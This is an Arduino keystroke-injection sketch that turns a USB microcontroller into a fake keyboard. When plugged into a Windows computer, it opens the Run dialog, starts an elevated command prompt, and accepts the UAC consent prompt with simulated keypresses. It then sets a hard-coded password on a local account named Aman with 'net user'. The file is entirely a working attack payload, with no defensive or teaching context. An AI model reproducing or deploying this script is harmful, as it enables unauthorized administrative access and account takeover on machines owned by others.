#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cmd");

  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(3000);

  typeKey(KEY_LEFT_ARROW);

  delay(750);

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("net user Aman aman441203");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}
